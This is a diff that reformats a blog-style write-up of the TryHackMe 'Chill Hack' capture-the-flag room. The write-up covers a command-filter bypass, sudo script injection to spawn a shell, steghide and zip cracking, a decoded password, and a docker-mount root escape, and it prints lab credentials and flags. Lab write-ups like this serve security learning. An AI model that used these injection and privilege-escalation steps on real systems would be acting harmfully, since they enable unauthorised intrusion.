@@ -6,16 +6,15 @@ categories:
   - TryHackMe
 ---
 
-<img src="chillhack.png" alt="chillhack" width=200/>
+{{< post-img src="chillhack.png" alt="chillhack" style="width: 200px;" >}}
 
 ## Enumeration
 
-### nmap
-```
+```bash
 PORT   STATE SERVICE REASON  VERSION
 21/tcp open  ftp     syn-ack vsftpd 3.0.3
-| ftp-syst: 
-|   STAT: 
+| ftp-syst:
+|   STAT:
 | FTP server status:
 |      Connected to ::ffff:10.8.226.203
 |      Logged in as ftp
@@ -31,7 +30,7 @@ PORT   STATE SERVICE REASON  VERSION
 |_-rw-r--r--    1 1001     1001           90 Oct 03  2020 note.txt
 
 22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
+| ssh-hostkey:
 |   2048 09:f9:5d:b9:18:d0:b2:3a:82:2d:6e:76:8c:c2:01:44 (RSA)
 | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDcxgJ3GDCJNTr2pG/lKpGexQ+zhCKUcUL0hjhsy6TLZsUE89P0ZmOoQrLQojvJD0RpfkUkDfd7ut4//Q0Gqzhbiak3AIOqEHVBIVcoINja1TIVq2v3mB6K2f+sZZXgYcpSQriwN+mKgIfrKYyoG7iLWZs92jsUEZVj7sHteOq9UNnyRN4+4FvDhI/8QoOQ19IMszrbpxQV3GQK44xyb9Fhf/Enzz6cSC4D9DHx+/Y1Ky+AFf0A9EIHk+FhU0nuxBdA3ceSTyu8ohV/ltE2SalQXROO70LMoCd5CQDx4o1JGYzny2SHWdKsOUUAkxkEIeEVXqa2pehJwqs0IEuC04sv
 |   256 1b:cf:3a:49:8b:1b:20:b0:2c:6a:a5:51:a8:8f:1e:62 (ECDSA)
@@ -42,14 +41,13 @@ PORT   STATE SERVICE REASON  VERSION
 80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
 |_http-favicon: Unknown favicon MD5: 7EEEA719D1DF55D478C68D9886707F17
 |_http-server-header: Apache/2.4.29 (Ubuntu)
-| http-methods: 
+| http-methods:
 |_  Supported Methods: POST OPTIONS HEAD GET
 Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 
 ```
 
-### ffuf
-```
+```bash
 .htaccess               [Status: 403, Size: 278, Words: 20, Lines: 10]
 .hta                    [Status: 403, Size: 278, Words: 20, Lines: 10]
 .htpasswd               [Status: 403, Size: 278, Words: 20, Lines: 10]
@@ -64,7 +62,7 @@ server-status           [Status: 403, Size: 278, Words: 20, Lines: 10]
 
 Go get `note.txt` in ftp folder
 
-```
+```text
 Anurodh told me that there is some filtering on strings being put in the command -- Apaar
 ```
 
@@ -75,8 +73,9 @@ some commands are not allowed...filter indeed
 after some trial and error I found you just have to enclose them with parentheses `()`
 
 `(cat /etc/passwd)`
-```
-root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin syslog:x:102:106::/home/syslog:/usr/sbin/nologin messagebus:x:103:107::/nonexistent:/usr/sbin/nologin _apt:x:104:65534::/nonexistent:/usr/sbin/nologin lxd:x:105:65534::/var/lib/lxd/:/bin/false uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin pollinate:x:109:1::/var/cache/pollinate:/bin/false sshd:x:110:65534::/run/sshd:/usr/sbin/nologin aurick:x:1000:1000:Anurodh:/home/aurick:/bin/bash mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false apaar:x:1001:1001:,,,:/home/apaar:/bin/bash anurodh:x:1002:1002:,,,:/home/anurodh:/bin/bash ftp:x:112:115:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin 
+
+```bash
+root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin syslog:x:102:106::/home/syslog:/usr/sbin/nologin messagebus:x:103:107::/nonexistent:/usr/sbin/nologin _apt:x:104:65534::/nonexistent:/usr/sbin/nologin lxd:x:105:65534::/var/lib/lxd/:/bin/false uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin pollinate:x:109:1::/var/cache/pollinate:/bin/false sshd:x:110:65534::/run/sshd:/usr/sbin/nologin aurick:x:1000:1000:Anurodh:/home/aurick:/bin/bash mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false apaar:x:1001:1001:,,,:/home/apaar:/bin/bash anurodh:x:1002:1002:,,,:/home/anurodh:/bin/bash ftp:x:112:115:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
 ```
 
 well...I tried some commands and seems I can have access..put a simple netcat reverse shell and I am in
@@ -86,7 +85,8 @@ Access to `home` folders and files is very restricted so we need to switch user
 let's go back to `www` folder and enumerate more
 
 `account.php`
-```
+
+```php
 <?php
 
 class Account
@@ -109,10 +109,10 @@ class Account
 }
 
 ?>
-
 ```
 `hacker.php`
-```
+
+```php
 <html>
 <head>
 <body>
@@ -140,10 +140,11 @@ h1
 </html>
 ```
 
-In the dark? 
+In the dark?
 
 `index.php`
-```
+
+```php
 <html>
 <body>
 <?php
@@ -194,7 +195,7 @@ hmm..not very useful yet...went back to `apaar` home folder
 
 Noticed a `.helpline.sh` script we can execute
 
-```
+```bash
 $ cat .helpline.sh
 #!/bin/bash
 
@@ -212,7 +213,8 @@ echo "Thank you for your precious time!"
 ```
 
 Wait a minute...
-```
+
+```bash
 $ sudo -l
 Matching Defaults entries for www-data on ubuntu:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
@@ -221,7 +223,7 @@ User www-data may run the following commands on ubuntu:
     (apaar : ALL) NOPASSWD: /home/apaar/.helpline.sh
 ```
 
-```
+```bash
 www-data@ubuntu:/home/apaar$ sudo -u apaar ./.helpline.sh
 sudo -u apaar ./.helpline.sh
 
@@ -236,7 +238,7 @@ Thank you for your precious time!
 
 we can inject commands in `msg` parameter  and make a shell spawn
 
-```
+```bash
 Enter the person whom you want to talk with: apaar
 apaar
 Hello user! I am apaar,  Please enter your message: /bin/bash
@@ -247,7 +249,7 @@ apaar
 ```
 We are apaar now
 
-```
+```bash
 cat local.txt
 {USER-FLAG: come_chill_with_us_bro}
 ```
@@ -259,7 +261,7 @@ let's go back to `www/files` folder and look into the dark...I guess
 
 Hearing that always make you suspect stegano so I need those images
 
-```
+```bash
 apaar@ubuntu:/var/www/files/images$ python3 -m http.server 4444
 python3 -m http.server 4444
 Serving HTTP on 0.0.0.0 port 4444 (http://0.0.0.0:4444/) ...
@@ -272,14 +274,14 @@ requête HTTP transmise, en attente de la réponse… 200 OK
 Taille : 68841 (67K) [image/jpeg]
 Sauvegarde en : « hacker-with-laptop_23-2147985341.jpg.1 »
 
-hacker-with-laptop_23-2147985341.jpg.1                     100%[========================================================================================================================================>]  67,23K   135KB/s    ds 0,5s    
+hacker-with-laptop_23-2147985341.jpg.1                     100%[========================================================================================================================================>]  67,23K   135KB/s    ds 0,5s
 
 2021-11-30 14:57:30 (135 KB/s) — « hacker-with-laptop_23-2147985341.jpg.1 » sauvegardé [68841/68841]
 ```
 
 Now I try to enumerate that mysql database too
 
-```
+```bash
 apaar@ubuntu:/var/www/files/images$ mysql -u root -p
 mysql -u root -p
 Enter password: !@m+her00+@db
@@ -351,27 +353,27 @@ bingo! we know already those are md5 so let's crack 'em!
 
 I hope they use those for system too...nope they aren't
 
-
 Ok stegano time
-```
+
+```bash
 └──╼ $steghide --info hacker-with-laptop_23-2147985341.jpg
 "hacker-with-laptop_23-2147985341.jpg":
   format: jpeg
   capacit�: 3,6 KB
 Essayer d'obtenir des informations � propos des donn�es incorpor�es ? (o/n) o
-Entrez la passphrase: 
+Entrez la passphrase:
   fichier � inclure "backup.zip":
     taille: 750,0 Byte
     cryptage: rijndael-128, cbc
     compression: oui
 
 └──╼ $steghide --extract -sf hacker-with-laptop_23-2147985341.jpg
-Entrez la passphrase: 
+Entrez la passphrase:
 �criture des donn�es extraites dans "backup.zip".
 ```
 Now let's crack `backup.zip`
 
-```
+```bash
 └──╼ $zip2john backup.zip > backup.john
 ver 2.0 efh 5455 efh 7875 backup.zip/source_code.php PKZIP Encr: 2b chk, TS_chk, cmplen=554, decmplen=1211, crc=69DC82F3
 
@@ -387,14 +389,14 @@ Session completed
 ```
 We get `source_code.php`
 
-```
+```php
 <?php
         if(isset($_POST['submit']))
 	{
 		$email = $_POST["email"];
 		$password = $_POST["password"];
 		if(base64_encode($password) == "IWQwbnRLbjB3bVlwQHNzdzByZA==")
-		{ 
+		{
 			$random = rand(1000,9999);?><br><br><br>
 			<form method="POST">
 				Enter the OTP: <input type="number" name="otp">
@@ -418,29 +420,31 @@ We get `source_code.php`
 
 oh `anurodh`'s password...with extra-steps
 
-```
+```bash
 └──╼ $echo IWQwbnRLbjB3bVlwQHNzdzByZA== | base64 -d
 !d0ntKn0wmYp@ssw0rd
 ```
 
 Shall we FINALLY connect as this guy?
 
-yes we shall! 
+yes we shall!
 
+```bash
 anurodh@ubuntu:~$ id
 uid=1002(anurodh) gid=1002(anurodh) groups=1002(anurodh),999(docker)
+```
 
 Now let's go root...wait docker? is that common?
 
 Gtfobins said it is NOT
 
-```
+```bash
 anurodh@ubuntu:~$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
 # whoami
 root
 ```
 
-```
+```bash
 # cat proof.txt
 
 
@@ -450,15 +454,15 @@ root
 Congratulations! You have successfully completed the challenge.
 
 
-         ,-.-.     ,----.                                             _,.---._    .-._           ,----.  
-,-..-.-./  \==\ ,-.--` , \   _.-.      _.-.             _,..---._   ,-.' , -  `. /==/ \  .-._ ,-.--` , \ 
-|, \=/\=|- |==||==|-  _.-` .-,.'|    .-,.'|           /==/,   -  \ /==/_,  ,  - \|==|, \/ /, /==|-  _.-` 
-|- |/ |/ , /==/|==|   `.-.|==|, |   |==|, |           |==|   _   _\==|   .=.     |==|-  \|  ||==|   `.-. 
- \, ,     _|==/==/_ ,    /|==|- |   |==|- |           |==|  .=.   |==|_ : ;=:  - |==| ,  | -/==/_ ,    / 
- | -  -  , |==|==|    .-' |==|, |   |==|, |           |==|,|   | -|==| , '='     |==| -   _ |==|    .-'  
-  \  ,  - /==/|==|_  ,`-._|==|- `-._|==|- `-._        |==|  '='   /\==\ -    ,_ /|==|  /\ , |==|_  ,`-._ 
-  |-  /\ /==/ /==/ ,     //==/ - , ,/==/ - , ,/       |==|-,   _`/  '.='. -   .' /==/, | |- /==/ ,     / 
-  `--`  `--`  `--`-----`` `--`-----'`--`-----'        `-.`.____.'     `--`--''   `--`./  `--`--`-----``  
+         ,-.-.     ,----.                                             _,.---._    .-._           ,----.
+,-..-.-./  \==\ ,-.--` , \   _.-.      _.-.             _,..---._   ,-.' , -  `. /==/ \  .-._ ,-.--` , \
+| , \=/\= | - | == |  | == | -  _.-` .-,.' | .-,.' | /==/,   -  \ /==/_,  ,  - \|== | , \/ /, /== | -  _.-` |
+| ------- |/ |/ , /==/|==|   `.-.|==|, |   |==|, |           |==|   _   _\==|   .=.     |==|-  \|  ||==|   `.-.
+ \, ,     _|==/==/_ ,    /|==|- |   |==|- |           |==|  .=.   |==|_ : ;=:  - |==| ,  | -/==/_ ,    /
+ | -  -  , |==|==|    .-' |==|, |   |==|, |           |==|,|   | -|==| , '='     |==| -   _ |==|    .-'
+  \  ,  - /==/|==|_  ,`-._|==|- `-._|==|- `-._        |==|  '='   /\==\ -    ,_ /|==|  /\ , |==|_  ,`-._
+  |-  /\ /==/ /==/ ,     //==/ - , ,/==/ - , ,/       |==|-,   _`/  '.='. -   .' /==/, | |- /==/ ,     /
+  `--`  `--`  `--`-----`` `--`-----'`--`-----'        `-.`.____.'     `--`--''   `--`./  `--`--`-----``
 
 
 --------------------------------------------Designed By -------------------------------------------------------
@@ -472,27 +476,20 @@ Twitter
 Linkedin
         - www.linkedin.com/in/anurodh-acharya-b1937116a
 
-
 ```
 
-that was less chill than expected but definitelly not hard
+that was less chill than expected but definitely not hard
 
 I read some writeups to check and it seems that you can drop apaar's ssh keys
 to connect to the webportal on port `9001`
 
 people mostly found that port using `linEnum`
 
-I try to avoid those scripts as much as possible but they can have their utilty
+I try to avoid those scripts as much as possible but they can have their utility
 
-there is `port-forwarding` involved in this method so it's very interresting
+there is `port-forwarding` involved in this method so it's very interesting
 
 I recently completed the `wreath network` room so tis could be extra fun
 
 anyway...we are done here! Peace out!
-
-
-
-
-
-
 
